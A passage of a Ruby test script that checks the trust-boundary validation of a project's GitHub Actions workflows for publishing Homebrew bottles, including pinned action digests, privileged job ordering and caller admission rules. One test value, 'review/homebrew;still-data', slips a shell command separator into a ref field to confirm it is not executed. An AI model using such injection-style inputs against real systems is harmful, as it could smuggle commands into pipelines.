#!/usr/bin/env ruby
# frozen_string_literal: true

require "digest"
require "json"
require "open3"
require "tempfile"
require "tmpdir"
require "yaml"

REPO_ROOT = File.expand_path("..", __dir__)
PUBLISHER_PATH = File.join(REPO_ROOT, ".github/workflows/reusable-homebrew-bottle-publish.yml")
NATIVE_COMPATIBILITY_PATH = File.join(
  REPO_ROOT, ".github/workflows/homebrew-native-publisher-compatibility.yml"
)
MAINTENANCE_PATH = File.join(REPO_ROOT, ".github/workflows/reusable-homebrew-bottle-maintenance.yml")
FIRST_PUBLICATION_PATH = File.join(
  REPO_ROOT, ".github/workflows/reusable-homebrew-repository-namespace-canary.yml"
)
PREFIX_FIRST_CHILD_PATH = File.join(
  REPO_ROOT,
  ".github/workflows/reusable-homebrew-prefix-first-child-publish.yml"
)
CLOSED_SELECTION_PATH = File.join(
  REPO_ROOT,
  ".github/workflows/reusable-homebrew-closed-selection-publish.yml"
)
WORKFLOW_ROOT = File.join(REPO_ROOT, ".github/workflows")
HOST_RUNTIME_PREPARER_PATH = File.join(
  REPO_ROOT, "scripts/prepare-homebrew-recipe-host-runtime.py"
)
HOST_RUNTIME_PREPARATION_STEP = "Seal conventional host runtime ownership"
PRIVILEGED_RECIPE_ENTRYPOINTS = %w[
  scripts/homebrew-bottle-build.sh
  scripts/homebrew-verify-poured-bottle.sh
  scripts/test-homebrew-publish-workflow.sh
].freeze
PRIVILEGED_RECIPE_JOBS = {
  ".github/workflows/reusable-homebrew-bottle-publish.yml:build-and-test" =>
    "/usr/bin/python3 kandelo/scripts/" \
      "prepare-homebrew-recipe-host-runtime.py",
  ".github/workflows/reusable-homebrew-bottle-publish.yml:verify-bottle" =>
    "/usr/bin/python3 kandelo/scripts/" \
      "prepare-homebrew-recipe-host-runtime.py",
  ".github/workflows/staging-build.yml:preflight" =>
    "/usr/bin/python3 scripts/prepare-homebrew-recipe-host-runtime.py",
}.freeze
ROOTFS_PUBLICATION_SELECTION_PATH = File.join(
  REPO_ROOT, "scripts/homebrew-rootfs-publication-selection.sh"
)
ROOTFS_PUBLICATION_SELECTION_SHA256 =
  "f1dfb9efdb1dcb81990b907c3ebee44cfa6cee87304af5fc54161f3fe4fc67c2"
TAP_CALLER_ROOT = File.join(REPO_ROOT, "homebrew/homebrew-tap-core/.github/workflows")
CHECKOUT_ACTION = "actions/checkout@de0fac2e4500dabe0009e67214ff5f5447ce83dd"
# WHY: the reusable publishers freeze v6 in their reviewed step digests. This
# read-only PR workflow follows the repository-wide v7 pin independently.
NATIVE_COMPATIBILITY_CHECKOUT_ACTION =
  "actions/checkout@9c091bb21b7c1c1d1991bb908d89e4e9dddfe3e0"
NIX_ACTION = "DeterminateSystems/nix-installer-action@ef8a148080ab6020fd15196c2084a2eea5ff2d25"
MAGIC_NIX_ACTION = "DeterminateSystems/magic-nix-cache-action@908b263ff629f4cc17666315b7fd3ec127c6244d"
UPLOAD_ACTION = "actions/upload-artifact@043fb46d1a93c77aae656e7c1c64a875d1fc6a0a"
DOWNLOAD_ACTION = "actions/download-artifact@3e5f45b2cfb9172054b4087a40e8e0b5a5461e7c"
BREW_COMMIT = "a92554a538e81fad0c5074443885dbcc4c36221d"
NATIVE_CA_PROOF_SHA256 =
  "5c88adf6e56116ff072023d726d6fa1e3fc86ee33d029c64265b315ba509468a"
NATIVE_LOCK_GENERATION_RUN_SHA256 =
  "749cb36f59e2ee42cc6a43903ad7c29ec6a5ba93fea16c3b4f59dde6110093a1"
NATIVE_LOCK_EQUALITY_RUN_SHA256 =
  "5b9e2687a6f2a431ca8f79e5b888d9ecc7ace116f8e7b18a9237dad2083156a6"
NATIVE_CA_PROOF_RUN_SHA256 =
  "c8192c2521864005b34e9eaa39d44d11d580997db39d6e64f2afe30fe447eb91"
NATIVE_CA_VALIDATION_RUN_SHA256 =
  "7cb1417ec6df08daefa71c2ee6a364be76737b9d7f7ed4aa4022d3d7ca90a8b9"
PUBLISHER_PLAN_DIGEST = "9d9e4571ee955c357914a6fd0a9727c42c3d3613b4ee59d5c327598c44680afb"
PUBLISHER_BUILD_DIGEST = "4dabfbe8be3192f1b4d62ad72e2ec27b275d527d24a8c89c12d9822eb5430afc"
PUBLISHER_UPLOAD_DIGEST = "861d649d73bb470fc37f99751733e8360f3f59f6245b80e2dd8d7eb4f40f3290"
PUBLISHER_INDEX_DIGEST = "30531067dcd20c314ef8ae4b9d8584716a92fc803a194098913355ebb519754b"
PUBLISHER_STAGE_DIGEST = "b77b9c5196cdc12d77f900d9c385dc369da294348bbd238fdf7619dfb2e609e8"
PUBLISHER_VERIFY_DIGEST = "6534a97faf0369ddefa0d1a4687a429aeb31d2246ad7bb15bf7e5594d7b64d69"
PUBLISHER_FINALIZE_DIGEST = "b17e7bf5d0a5ef512e49f74c224a94958642dfdd80a27439f2a0335816a0886b"
PUBLISHER_VFS_RELEASE_DIGEST = "2db9ec075edf382e326066d5f49a32947f5a584fce26a966fb9fff23bbbe3c26"
MAINTENANCE_VALIDATE_DIGEST = "30ebccd5d44e004e37f168e81284d7ceb18accfa067c05248c1cc19398a7515f"
MAINTENANCE_ROLLBACK_DIGEST = "f82d9f351202c3a20824e4525eb88ce7f75879740014d3232e69f3d585ed5781"
OCI_CROSS_TAP_COMPOSE_BOUNDARY =
  "bash scripts/dev-shell.sh env \\\n" \
  '  KANDELO_HOMEBREW_RESOLVED_TAPS_FILE="$KANDELO_HOMEBREW_RESOLVED_TAPS_FILE" \\' + "\n" \
  "  python3 scripts/homebrew-oci-layout.py build-child \\"
FIRST_PUBLICATION_STEPS_DIGEST = "cf1c41bbfb91a1e5de6e7e0bfe7c16406dd3d022ad66dec7188cb31240168c7e"
PREFIX_FIRST_CHILD_STEPS_DIGEST = "a21e78df740ced6c50719eec1d749e590410b83f776a153c0858cad708841959"
SELF_TEST_TAP_SHA = "e" * 40
SELF_TEST_KANDELO_MAIN_SHA = "a351fc9b18da032c09160c95f1da672374ade700"
SELF_TEST_PACKAGE_GENERATION_WASM32 =
  "package-generation-browser-inputs-wasm32-abi-v42-sha256-#{"c" * 64}"
SELF_TEST_PACKAGE_GENERATION_WASM64 =
  "package-generation-browser-inputs-wasm64-abi-v42-sha256-#{"d" * 64}"
SELF_TEST_PACKAGE_GENERATION_ROOTFS =
  "package-generation-rootfs-wasm32-abi-v42-sha256-#{"f" * 64}"

def check(condition, message)
  raise message unless condition
end

def load_workflow(path)
  workflow = YAML.safe_load_file(path, aliases: false)
  check(workflow.is_a?(Hash), "#{File.basename(path)} is not a workflow mapping")
  workflow
end

def workflow_events(workflow)
  events = workflow.key?("on") ? workflow["on"] : workflow[true]
  check(events.is_a?(Hash), "workflow on: value is not a mapping")
  events
end

def values_for_key(node, wanted, values = [])
  case node
  when Hash
    node.each do |key, value|
      values << value if key.to_s == wanted
      values_for_key(value, wanted, values)
    end
  when Array
    node.each { |value| values_for_key(value, wanted, values) }
  end
  values
end

def deep_copy(value)
  Marshal.load(Marshal.dump(value))
end

def canonical_contract(value)
  case value
  when Hash
    value.keys.sort_by(&:to_s).to_h do |key|
      [key.to_s, canonical_contract(value.fetch(key))]
    end
  when Array
    value.map { |entry| canonical_contract(entry) }
  else
    value
  end
end

def contract_digest(value)
  Digest::SHA256.hexdigest(JSON.generate(canonical_contract(value)))
end

def workflow_jobs(workflow)
  jobs = workflow["jobs"]
  check(jobs.is_a?(Hash), "workflow jobs: value is not a mapping")
  jobs
end

def job_steps(job, label)
  steps = job["steps"]
  check(steps.is_a?(Array), "#{label} steps: value is not an array")
  check(steps.all? { |step| step.is_a?(Hash) }, "#{label} contains a non-mapping step")
  steps
end

def named_step(steps, name)
  matches = steps.select { |step| step["name"] == name }
  check(matches.length == 1, "expected exactly one #{name.inspect} step")
  matches.first
end

def load_all_workflows
  Dir.glob(File.join(WORKFLOW_ROOT, "*.{yml,yaml}")).sort.to_h do |path|
    relative = path.delete_prefix("#{REPO_ROOT}/")
    [relative, load_workflow(path)]
  end
end

def check_privileged_recipe_host_runtime(workflows)
  actual = {}
  workflows.each do |path, workflow|
    workflow_jobs(workflow).each do |job_name, job|
      next unless job.is_a?(Hash) && job["steps"].is_a?(Array)

      steps = job_steps(job, "#{path}:#{job_name}")
      privileged_indices = steps.each_index.select do |index|
        source = steps.fetch(index).fetch("run", "")
        PRIVILEGED_RECIPE_ENTRYPOINTS.any? do |entrypoint|
          source.include?(entrypoint)
        end
      end
      next if privileged_indices.empty?

      actual["#{path}:#{job_name}"] = [steps, privileged_indices]
    end
  end

  check(
    actual.keys.sort == PRIVILEGED_RECIPE_JOBS.keys.sort,
    "privileged recipe job set changed: expected " \
      "#{PRIVILEGED_RECIPE_JOBS.keys.sort.inspect}, got #{actual.keys.sort.inspect}"
  )
  actual.each do |label, (steps, privileged_indices)|
    expected_command = PRIVILEGED_RECIPE_JOBS.fetch(label)
    preparation_indices = steps.each_index.select do |index|
      step = steps.fetch(index)
      step["name"] == HOST_RUNTIME_PREPARATION_STEP &&
        step["run"] == expected_command &&
        !step.key?("if") &&
        !step.key?("continue-on-error")
    end
    check(
      preparation_indices.length == 1,
      "#{label} must run the exact host-runtime preparation once"
    )
    check(
      preparation_indices.first < privileged_indices.min,
      "#{label} enters privileged recipe execution before sealing host " \
        "projection ancestry"
    )
  end
end

def caller_validation_result(source, overrides = {})
  env = {
    "CALLER_ACTION" => "dry-run-bottles",
    "CALLER_CLIENT_PAYLOAD" => "{}",
    "CALLER_EVENT_NAME" => "repository_dispatch",
    "CALLER_REF" => "refs/heads/main",
    "CALLER_REPOSITORY" => "kandelo-dev/homebrew-tap-core",
    "CALLER_WORKFLOW_REF" =>
      "kandelo-dev/homebrew-tap-core/.github/workflows/dry-run-bottles.yml@refs/heads/main",
    "DEFER_TAP_FINALIZATION" => "false",
    "DRY_RUN" => "true",
    "FORCE_REBUILD" => "false",
    "ARCHES" => "wasm32",
    "FORMULAE" => "file-formula",
    "KANDELO_REPOSITORY" => "Automattic/kandelo",
    "KANDELO_REF" => "main",
    "PACKAGE_GENERATION_WASM32" => "",
    "PACKAGE_GENERATION_WASM64" => "",
    "PREFIX_CAMPAIGN_DEPENDENCIES" => "",
    "PREFIX_CAMPAIGN_TAG" => "",
    "REVALIDATION_SOURCE" => "",
    "REQUIRE_VFS_ACCEPTANCE" => "false",
    "TAP_NAME" => "kandelo-dev/tap-core",
    "TAP_REPOSITORY" => "kandelo-dev/homebrew-tap-core",
    "TAP_REF" => "main",
    "BOTTLE_ROOT_URL" => "",
  }.merge(overrides)

  Tempfile.create("kandelo-homebrew-trust-output") do |output|
    env["GITHUB_OUTPUT"] = output.path
    stdout, stderr, status = Open3.capture3(
      env, "bash", "--noprofile", "--norc", "-c", source
    )
    output.flush
    {
      "status" => status.exitstatus,
      "stdout" => stdout,
      "stderr" => stderr,
      "outputs" => File.read(output.path),
    }
  end
end

def maintenance_validation_result(source, overrides = {})
  env = {
    "CALLER_EVENT_NAME" => "repository_dispatch",
    "CALLER_REF" => "refs/heads/main",
    "CALLER_REPOSITORY" => "kandelo-dev/homebrew-tap-core",
    "CALLER_WORKFLOW_REF" =>
      "kandelo-dev/homebrew-tap-core/.github/workflows/maintain-bottles.yml@refs/heads/main",
    "KANDELO_REF" => SELF_TEST_KANDELO_MAIN_SHA,
    "MODE" => "rebuild",
    "TAP_REF" => SELF_TEST_TAP_SHA,
  }.merge(overrides)
  stdout, stderr, status = Open3.capture3(
    env, "bash", "--noprofile", "--norc", "-c", source
  )
  { "status" => status.exitstatus, "stdout" => stdout, "stderr" => stderr }
end

def kandelo_main_admission_result(source, overrides = {})
  env = {
    "KANDELO_REPOSITORY" => "Automattic/kandelo",
    "KANDELO_SHA" => SELF_TEST_KANDELO_MAIN_SHA,
    "TEST_GH_FAILURE" => "false",
    "TEST_MAIN_SHA" => SELF_TEST_KANDELO_MAIN_SHA,
  }.merge(overrides)
  Dir.mktmpdir("kandelo-homebrew-main-admission") do |directory|
    gh = File.join(directory, "gh")
    File.write(gh, <<~BASH)
      #!/usr/bin/env bash
      set -euo pipefail
      [ "${TEST_GH_FAILURE:?}" = "false" ] || exit 92
      [ "$#" -eq 4 ] &&
        [ "$1" = api ] &&
        [ "$2" = "/repos/Automattic/kandelo/git/ref/heads/main" ] &&
        [ "$3" = --jq ] &&
        [ "$4" = .object.sha ] || exit 91
      printf '%s\\n' "${TEST_MAIN_SHA:?}"
    BASH
    File.chmod(0o755, gh)
    env["PATH"] = "#{directory}:#{ENV.fetch('PATH')}"
    stdout, stderr, status = Open3.capture3(
      env, "bash", "--noprofile", "--norc", "-c", source
    )
    {
      "status" => status.exitstatus,
      "stdout" => stdout,
      "stderr" => stderr,
    }
  end
end

def tap_source_binding_result(source, overrides = {})
  env = {
    "REQUESTED_TAP_SHA" => SELF_TEST_TAP_SHA,
    "TAP_REPOSITORY" => "kandelo-dev/homebrew-tap-core",
    "TAP_SHA" => SELF_TEST_TAP_SHA,
    "TEST_COMPARE_STATUS" => "identical",
    "TEST_GH_FAILURE" => "false",
  }.merge(overrides)
  Dir.mktmpdir("kandelo-homebrew-caller-binding") do |directory|
    gh = File.join(directory, "gh")
    File.write(gh, <<~BASH)
      #!/usr/bin/env bash
      set -euo pipefail
      [ "${TEST_GH_FAILURE:?}" = "false" ] || exit 92
      [ "$#" -eq 4 ] &&
        [ "$1" = api ] &&
        [ "$2" = "/repos/kandelo-dev/homebrew-tap-core/compare/#{SELF_TEST_TAP_SHA}...main" ] &&
        [ "$3" = --jq ] &&
        [ "$4" = .status ] || exit 91
      printf '%s\\n' "${TEST_COMPARE_STATUS:?}"
    BASH
    File.chmod(0o755, gh)
    env["PATH"] = "#{directory}:#{ENV.fetch('PATH')}"
    stdout, stderr, status = Open3.capture3(
      env, "bash", "--noprofile", "--norc", "-c", source
    )
    {
      "status" => status.exitstatus,
      "stdout" => stdout,
      "stderr" => stderr,
    }
  end
end

def expected_caller_outputs(
  kandelo_ref, tap_ref, wasm32: "", wasm64: "", kind: "none",
  campaign_mode: "false", campaign_tag: "", campaign_dependencies: "",
  revalidation_mode: "false", revalidation_source: ""
)
  "kandelo-ref=#{kandelo_ref}\n" \
    "tap-ref=#{tap_ref}\n" \
    "package-generation-wasm32=#{wasm32}\n" \
    "package-generation-wasm64=#{wasm64}\n" \
    "package-generation-kind=#{kind}\n" \
    "prefix-campaign-mode=#{campaign_mode}\n" \
    "prefix-campaign-tag=#{campaign_tag}\n" \
    "prefix-campaign-dependencies=#{campaign_dependencies}\n" \
    "revalidation-mode=#{revalidation_mode}\n" \
    "revalidation-source=#{revalidation_source}\n"
end

def check_caller_validation_behavior(workflow)
  plan_steps = job_steps(workflow_jobs(workflow).fetch("plan"), "publisher plan")
  source = named_step(plan_steps, "Validate caller trust boundary").fetch("run")
  write_caller = {
    "CALLER_ACTION" => "publish-kandelo-bottles",
    "CALLER_WORKFLOW_REF" =>
      "kandelo-dev/homebrew-tap-core/.github/workflows/publish-bottles.yml@refs/heads/main",
    "DRY_RUN" => "false",
    "KANDELO_REF" => SELF_TEST_KANDELO_MAIN_SHA,
    "PACKAGE_GENERATION_WASM32" => SELF_TEST_PACKAGE_GENERATION_WASM32,
    "PACKAGE_GENERATION_WASM64" => SELF_TEST_PACKAGE_GENERATION_WASM64,
    "TAP_REF" => SELF_TEST_TAP_SHA,
  }.freeze

  branch = caller_validation_result(source, {
    "KANDELO_REF" => "review/homebrew_source-1.2",
    "TAP_REF" => "formula/pilot_1.2",
  })
  check(branch["status"] == 0 && branch["outputs"] == expected_caller_outputs(
          "refs/heads/review/homebrew_source-1.2",
          "refs/heads/formula/pilot_1.2"
        ),
        "publisher dry-run does not normalize reviewed branch names")

  kandelo_sha = "a" * 40
  tap_sha = "b" * 40
  exact = caller_validation_result(source, {
    "KANDELO_REF" => kandelo_sha,
    "TAP_REF" => tap_sha,
  })
  check(exact["status"] == 0 && exact["outputs"] ==
        expected_caller_outputs(kandelo_sha, tap_sha),
        "publisher dry-run does not accept exact source commits")

  data_only = caller_validation_result(source, {
    "KANDELO_REF" => "review/homebrew;still-data",
  })
  check(data_only["status"] == 0 && data_only["outputs"].include?(
          "kandelo-ref=refs/heads/review/homebrew;still-data\n"
        ), "publisher dry-run interpolates a valid source ref as shell syntax")

  mixed_case = caller_validation_result(source, {
    "CALLER_REPOSITORY" => "Kandelo-Dev/Homebrew-Tap-Core",
    "CALLER_WORKFLOW_REF" =>
      "Kandelo-Dev/Homebrew-Tap-Core/.github/workflows/dry-run-bottles.yml@refs/heads/main",
    "TAP_NAME" => "Kandelo-Dev/Tap-Core",
    "TAP_REPOSITORY" => "KANDELO-DEV/HOMEBREW-TAP-CORE",
  })
  check(mixed_case["status"] == 0 && mixed_case["outputs"] ==
        expected_caller_outputs("refs/heads/main", "refs/heads/main"),
        "publisher does not compare GitHub repository identities case-insensitively")

  case_variant_workflow = caller_validation_result(source, {
    "CALLER_WORKFLOW_REF" =>
      "kandelo-dev/homebrew-tap-core/.github/workflows/DRY-RUN-BOTTLES.YML@refs/heads/main",
  })
  check(case_variant_workflow["status"] == 2 &&
        case_variant_workflow["stdout"].include?(
          "dry-run publication requires the reviewed tap dry-run workflow"
        ), "publisher accepts a case-variant workflow path")

  write_sha = caller_validation_result(source, write_caller.merge({
    "KANDELO_REF" => kandelo_sha,
  }))
  check(write_sha["status"] == 0 && write_sha["outputs"] ==
        expected_caller_outputs(
          kandelo_sha,
          SELF_TEST_TAP_SHA,
          wasm32: SELF_TEST_PACKAGE_GENERATION_WASM32,
          wasm64: SELF_TEST_PACKAGE_GENERATION_WASM64,
          kind: "browser-inputs"
        ),
        "publisher write path does not accept an exact reviewed Kandelo commit")

  deferred_write = write_caller.merge({
    "DEFER_TAP_FINALIZATION" => "true",
    "FORMULAE" => "ruby",
    "ARCHES" => "wasm32",
  })
  deferred = caller_validation_result(source, deferred_write)
  check(deferred["status"] == 0 && deferred["outputs"] ==
        expected_caller_outputs(
          SELF_TEST_KANDELO_MAIN_SHA,
          SELF_TEST_TAP_SHA,
          wasm32: SELF_TEST_PACKAGE_GENERATION_WASM32,
          wasm64: SELF_TEST_PACKAGE_GENERATION_WASM64,
          kind: "browser-inputs"
        ),
        "publisher rejects deferred finalization from the exact ordinary " \
          "write caller")

  {
    "another write workflow" => [{
      "CALLER_WORKFLOW_REF" =>
        "kandelo-dev/homebrew-tap-core/.github/workflows/" \
          "maintain-bottles.yml@refs/heads/main",
    }, "ordinary deferred publication requires the exact protected " \
      "publish caller"],
    "another repository-dispatch action" => [{
      "CALLER_ACTION" => "maintain-kandelo-bottles",
    }, "ordinary deferred publication requires the exact protected " \
      "publish caller"],
    "dry-run mode" => [{
      "DRY_RUN" => "true",
    }, "ordinary deferred publication requires write mode and no VFS " \
      "acceptance"],
    "more than one Formula" => [{
      "FORMULAE" => "ruby,zlib",
    }, "ordinary deferred publication requires exactly one Formula"],
    "more than one architecture" => [{
      "ARCHES" => "wasm32,wasm64",
    }, "ordinary deferred publication requires exactly one architecture"],
    "VFS acceptance" => [{
      "REQUIRE_VFS_ACCEPTANCE" => "true",
    }, "ordinary deferred publication requires write mode and no VFS " \
      "acceptance"],
    "campaign authority" => [{
      "PREFIX_CAMPAIGN_DEPENDENCIES" => '{"dependencies":[],"schema":1}',
      "PREFIX_CAMPAIGN_TAG" => "homebrew-prefix-campaign-sha256-#{"1" * 64}",
    }, "only the reviewed prefix campaign caller may pass campaign authority"],
    "prior-run revalidation" => [{
      "REVALIDATION_SOURCE" => "{}",
    }, "only the reviewed prefix campaign caller may import prior-run artifacts"],
  }.each do |label, (override, error)|
    rejected = caller_validation_result(source, deferred_write.merge(override))
    check(rejected["status"] == 2 && rejected["stdout"].include?(error),
          "publisher deferred ordinary caller accepts #{label}")
  end

  dry_generations = caller_validation_result(source, {
    "PACKAGE_GENERATION_WASM32" => SELF_TEST_PACKAGE_GENERATION_WASM32,
    "PACKAGE_GENERATION_WASM64" => SELF_TEST_PACKAGE_GENERATION_WASM64,
  })
  check(dry_generations["status"] == 0 &&
        dry_generations["outputs"] == expected_caller_outputs(
          "refs/heads/main",
          "refs/heads/main",
          wasm32: SELF_TEST_PACKAGE_GENERATION_WASM32,
          wasm64: SELF_TEST_PACKAGE_GENERATION_WASM64,
          kind: "browser-inputs"
        ),
        "publisher dry-run does not preserve optional exact generation tags")

  rootfs_write = caller_validation_result(source, write_caller.merge({
    "PACKAGE_GENERATION_WASM32" => SELF_TEST_PACKAGE_GENERATION_ROOTFS,
    "PACKAGE_GENERATION_WASM64" => "",
  }))
  check(rootfs_write["status"] == 0 &&
        rootfs_write["outputs"] == expected_caller_outputs(
          SELF_TEST_KANDELO_MAIN_SHA,
          SELF_TEST_TAP_SHA,
          wasm32: SELF_TEST_PACKAGE_GENERATION_ROOTFS,
          kind: "rootfs-wasm32"
        ),
        "publisher write path does not admit the bounded rootfs-wasm32 lane")
  rootfs_dry_run = caller_validation_result(source, {
    "PACKAGE_GENERATION_WASM32" => SELF_TEST_PACKAGE_GENERATION_ROOTFS,
    "PACKAGE_GENERATION_WASM64" => "",
  })
  check(rootfs_dry_run["status"] == 2 &&
        rootfs_dry_run["stdout"].include?(
          "the rootfs-wasm32 publication lane requires exact runtime materialization and is unavailable in dry-run"
        ),
        "publisher dry-run claims rootfs generation evidence without exact materialization")

  campaign_tag = "homebrew-prefix-campaign-sha256-#{"1" * 64}"
  campaign_dependencies = '{"dependencies":[],"schema":1}'
  campaign_caller = write_caller.merge({
    "CALLER_ACTION" => "publish-prefix-campaign-bottle",
    "CALLER_WORKFLOW_REF" =>
      "kandelo-dev/homebrew-tap-core/.github/workflows/" \
      "prefix-campaign-bottles.yml@refs/heads/main",
    "DEFER_TAP_FINALIZATION" => "true",
    "FORCE_REBUILD" => "true",
    "FORMULAE" => "bzip2",
    "PREFIX_CAMPAIGN_DEPENDENCIES" => campaign_dependencies,
    "PREFIX_CAMPAIGN_TAG" => campaign_tag,
  })
  campaign = caller_validation_result(source, campaign_caller)
  check(campaign["status"] == 0 && campaign["outputs"] ==
        expected_caller_outputs(
          SELF_TEST_KANDELO_MAIN_SHA,
          SELF_TEST_TAP_SHA,
          wasm32: SELF_TEST_PACKAGE_GENERATION_WASM32,
          wasm64: SELF_TEST_PACKAGE_GENERATION_WASM64,
          kind: "browser-inputs",
          campaign_mode: "true",
          campaign_tag: campaign_tag,
          campaign_dependencies: campaign_dependencies
        ),
        "publisher rejects the exact reviewed prefix-campaign contract")

  campaign_dry_run = caller_validation_result(
    source,
    campaign_caller.merge({
      "DRY_RUN" => "true",
      "PACKAGE_GENERATION_WASM32" =>
        SELF_TEST_PACKAGE_GENERATION_ROOTFS,
      "PACKAGE_GENERATION_WASM64" => "",
    })
  )
  check(campaign_dry_run["status"] == 0 &&
        campaign_dry_run["outputs"] == expected_caller_outputs(
          SELF_TEST_KANDELO_MAIN_SHA,
          SELF_TEST_TAP_SHA,
          wasm32: SELF_TEST_PACKAGE_GENERATION_ROOTFS,
          kind: "rootfs-wasm32",
          campaign_mode: "true",
          campaign_tag: campaign_tag,
          campaign_dependencies: campaign_dependencies
        ),
        "publisher rejects the exact campaign bootstrap dry-run contract")

  {
    "non-forced build" => { "FORCE_REBUILD" => "false" },
    "immediate tap finalization" => { "DEFER_TAP_FINALIZATION" => "false" },
    "VFS acceptance" => { "REQUIRE_VFS_ACCEPTANCE" => "true" },
  }.each do |label, override|
    rejected = caller_validation_result(source, campaign_caller.merge(override))
    check(rejected["status"] == 2 && rejected["stdout"].include?(
            "prefix campaign publication requires force, " \
            "deferred finalization, and no VFS acceptance"
          ), "publisher campaign accepts #{label}")
  end
  multiple_formulae = caller_validation_result(
    source, campaign_caller.merge("FORMULAE" => "bzip2,zlib")
  )
  check(multiple_formulae["status"] == 2 &&
        multiple_formulae["stdout"].include?(
          "prefix campaign publication requires exactly one Formula"
        ), "publisher campaign accepts more than one Formula")
  multiple_arches = caller_validation_result(
    source, campaign_caller.merge("ARCHES" => "wasm32,wasm64")
  )
  check(multiple_arches["status"] == 2 &&
        multiple_arches["stdout"].include?(
          "prefix campaign publication requires exactly one architecture"
        ), "publisher campaign accepts more than one architecture")

  revalidation_source = JSON.generate(canonical_contract({
    "schema" => 1,
    "repository" => "kandelo-dev/homebrew-tap-core",
    "run_id" => 30_868_804_114,
    "run_attempt" => 1,
    "head_sha" => "b" * 40,
    "producer_kandelo_commit" => SELF_TEST_KANDELO_MAIN_SHA,
    "producer_tap_commit" => SELF_TEST_TAP_SHA,
    "campaign_tag" => campaign_tag,
    "formula" => "bzip2",
    "arch" => "wasm32",
    "bottle" => { "bytes" => 123, "sha256" => "c" * 64 },
    "child_manifest_digest" => "sha256:#{"d" * 64}",
    "top_index_digest" => "sha256:#{"e" * 64}",
    "artifacts" => {
      "build_handoff" => {
        "id" => 101, "size" => 1001, "digest" => "sha256:#{"1" * 64}",
        "name" => "homebrew-build-handoff-bzip2-wasm32-attempt-1",
      },
      "oci_child" => {
        "id" => 102, "size" => 1002, "digest" => "sha256:#{"2" * 64}",
        "name" => "homebrew-oci-child-bzip2-wasm32-attempt-1",
      },
      "upload_receipt" => {
        "id" => 103, "size" => 1003, "digest" => "sha256:#{"3" * 64}",
        "name" => "homebrew-upload-receipt-bzip2-wasm32-attempt-1",
      },
      "index_publication" => {
        "id" => 104, "size" => 1004, "digest" => "sha256:#{"4" * 64}",
        "name" => "homebrew-index-publication-bzip2-attempt-1",
      },
    },
    "jobs" => { "build" => 201, "upload" => 202, "index" => 203, "verify" => 204 },
  }))
  revalidation_caller = campaign_caller.merge({
    "CALLER_ACTION" => "revalidate-f901-file-formula",
    "REVALIDATION_SOURCE" => revalidation_source,
  })
  revalidation = caller_validation_result(source, revalidation_caller)
  check(revalidation["status"] == 0 && revalidation["outputs"] ==
        expected_caller_outputs(
          SELF_TEST_KANDELO_MAIN_SHA,
          SELF_TEST_TAP_SHA,
          wasm32: SELF_TEST_PACKAGE_GENERATION_WASM32,
          wasm64: SELF_TEST_PACKAGE_GENERATION_WASM64,
          kind: "browser-inputs",
          campaign_mode: "true",
          campaign_tag: campaign_tag,
          campaign_dependencies: campaign_dependencies,
          revalidation_mode: "true",
          revalidation_source: revalidation_source
        ), "publisher rejects exact prior-run revalidation authority")
  {
    "ordinary campaign action" => {
      "CALLER_ACTION" => "publish-prefix-campaign-bottle",
    },
    "nonempty payload" => { "CALLER_CLIENT_PAYLOAD" => '{"unexpected":true}' },
    "dry-run" => { "DRY_RUN" => "true" },
    "noncanonical descriptor" => {
      "REVALIDATION_SOURCE" => "#{revalidation_source} ",
    },
  }.each do |label, override|
    rejected = caller_validation_result(source, revalidation_caller.merge(override))
    check(rejected["status"] == 2,
          "publisher prior-run revalidation accepts #{label}")
  end
  ordinary_revalidation = caller_validation_result(
    source, write_caller.merge("REVALIDATION_SOURCE" => revalidation_source)
  )
  check(ordinary_revalidation["status"] == 2 &&
        ordinary_revalidation["stdout"].include?(
          "only the reviewed prefix campaign caller may import prior-run artifacts"
        ), "ordinary publisher caller imports prior-run artifacts")

  ordinary_with_campaign_authority = caller_validation_result(
    source, write_caller.merge({
      "DEFER_TAP_FINALIZATION" => "true",
      "PREFIX_CAMPAIGN_DEPENDENCIES" => campaign_dependencies,
      "PREFIX_CAMPAIGN_TAG" => campaign_tag,
    })
  )
  check(ordinary_with_campaign_authority["status"] == 2 &&
        ordinary_with_campaign_authority["stdout"].include?(
          "only the reviewed prefix campaign caller may pass campaign " \
          "authority"
        ), "ordinary publisher caller accepts campaign authority")

  {
    "wasm32 tag bound to wasm64" => {
      "PACKAGE_GENERATION_WASM32" => SELF_TEST_PACKAGE_GENERATION_WASM64,
    },
    "wasm64 tag bound to wasm32" => {
      "PACKAGE_GENERATION_WASM64" => SELF_TEST_PACKAGE_GENERATION_WASM32,
    },
    "mutable wasm32 generation name" => {
      "PACKAGE_GENERATION_WASM32" => "package-generation-browser-inputs-wasm32-latest",
    },
    "uppercase wasm64 digest" => {
      "PACKAGE_GENERATION_WASM64" => SELF_TEST_PACKAGE_GENERATION_WASM64.upcase,
    },
  }.each do |label, override|
    rejected = caller_validation_result(source, override)
    arch = override.key?("PACKAGE_GENERATION_WASM32") ? "wasm32" : "wasm64"
    check(rejected["status"] == 2 && rejected["stderr"].include?(
            "package-generation-#{arch} must be an exact supported content tag"
          ), "publisher dry-run accepts #{label}")
  end

  [
    ["missing wasm32 generation", "PACKAGE_GENERATION_WASM32"],
    ["missing wasm64 generation", "PACKAGE_GENERATION_WASM64"],
  ].each do |label, missing|
    rejected = caller_validation_result(source, write_caller.merge(missing => ""))
    check(rejected["status"] == 2 && rejected["stderr"].include?(
            "#{missing.downcase.tr('_', '-')} must be an exact supported content tag"
          ), "publisher write path accepts #{label}")
  end

  rootfs_with_wasm64 = caller_validation_result(source, write_caller.merge({
    "PACKAGE_GENERATION_WASM32" => SELF_TEST_PACKAGE_GENERATION_ROOTFS,
  }))
  check(rootfs_with_wasm64["status"] == 2 &&
        rootfs_with_wasm64["stderr"].include?(
          "the rootfs-wasm32 publication lane forbids a wasm64 generation"
        ), "publisher write path combines rootfs-wasm32 with wasm64")

  write_branch = caller_validation_result(source, write_caller.merge({
    "KANDELO_REF" => "review/homebrew",
  }))
  check(write_branch["status"] == 2 &&
        write_branch["stderr"].include?(
          "write publication requires an exact lowercase 40-character Kandelo commit SHA"
        ),
        "publisher write path accepts a mutable non-main Kandelo ref")

  {
    "fully qualified main" => "refs/heads/main",
    "mutable main" => "main",
    "uppercase commit" => "A" * 40,
    "short commit" => "a" * 39,
    "long commit" => "a" * 41,
  }.each do |label, ref|
    rejected = caller_validation_result(source, write_caller.merge({
      "KANDELO_REF" => ref,
    }))
    check(rejected["status"] == 2 &&
          rejected["stderr"].include?(
